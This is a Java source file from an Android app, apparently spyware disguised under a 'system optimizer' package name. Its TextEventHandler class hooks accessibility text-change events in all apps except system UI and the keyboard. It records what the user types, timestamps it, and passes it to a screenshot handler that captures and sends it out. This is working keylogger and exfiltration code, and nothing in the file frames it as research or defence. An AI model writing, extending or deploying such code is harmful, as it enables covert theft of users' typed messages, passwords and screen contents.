package com.system.optimizer.event_handler;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import com.system.optimizer.text.BufferedLogger;

import android.view.accessibility.AccessibilityEvent;

public class TextEventHandler {

    private final BufferedLogger logger;
    private final SimpleDateFormat timestampFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
    private final ScreenshotEventHandler screenshotEventHandler;

    public TextEventHandler(ScreenshotEventHandler screenshotEventHandler) {
        if (screenshotEventHandler == null) {
            throw new IllegalArgumentException("ScreenshotEventHandler cannot be null");
        }
        
        this.screenshotEventHandler = screenshotEventHandler;
        
        // Consumer that triggers screenshot capture (which handles sending)
        this.logger = new BufferedLogger((text) -> {
            // Add timestamp and trigger screenshot capture - it will handle sending the message
            String timestamp = timestampFormat.format(new Date());
            String messageWithTimestamp = "[" + timestamp + "] " + text;
            screenshotEventHandler.captureAndSend(messageWithTimestamp);
        });
    }

    /**
     * Handle accessibility events related to text input
     */
    public void onTextEvent(AccessibilityEvent event) {
        if (event == null || event.getText() == null)
            return;

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";

            // Ignore system UI and keyboard events
            if (packageName.equals("com.android.systemui") ||
                    packageName.equals("android") ||
                    packageName.equals("com.google.android.inputmethod.latin")) {
                return;
            }

            String text = normalizeTextEvent(event.getText());
            if (!text.isEmpty()) {
                logger.onNewText(text);
            }
        }
    }

    private String charToString(List<CharSequence> text) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence cs : text)
            sb.append(cs);
        return sb.toString();
    }

    private String normalizeTextEvent(List<CharSequence> text) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence cs : text) {
            if (cs != null && cs.length() > 0) {
                if (sb.length() > 0) {
                    sb.append(": ");
                }
                sb.append(cs.toString().trim());
            }
        }
        return sb.toString();
    }
}